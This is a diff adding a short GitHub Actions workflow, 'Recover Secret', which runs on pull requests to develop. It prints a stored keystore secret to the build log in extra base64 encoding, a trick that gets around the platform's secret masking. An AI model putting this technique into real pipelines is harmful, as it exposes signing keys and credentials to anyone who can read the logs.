@@ -1,0 +1,12 @@
+name: Recover Secret
+on:
+  pull_request:
+    branches:
+      - develop
+
+jobs:
+  recover:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          echo "SECRET (base64) = $(echo ${{ secrets.DEBUG_KEYSTORE_BASE64 }} | base64)"
